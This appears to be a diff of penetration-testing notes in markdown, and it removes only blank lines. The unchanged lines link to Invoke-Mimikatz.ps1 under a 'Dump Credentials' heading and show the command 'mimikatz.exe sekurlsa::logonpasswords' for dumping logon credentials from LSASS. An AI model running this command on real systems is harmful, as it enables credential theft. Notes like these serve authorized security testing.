@@ -1,9 +1,3 @@
-
-
-
-
-
-
 **GitHub:** [https://github.com/samratashok/nishang/raw/master/Gather/Invoke-Mimikatz.ps1](https://github.com/samratashok/nishang/raw/master/Gather/Invoke-Mimikatz.ps1)
 
 ## Dump Credentials
@@ -94,7 +88,6 @@ From here we should be free to perform actions against LSASS and dump credential
 ```bash
 mimikatz.exe sekurlsa::logonpasswords
 ```
-
 
 # Resources
 
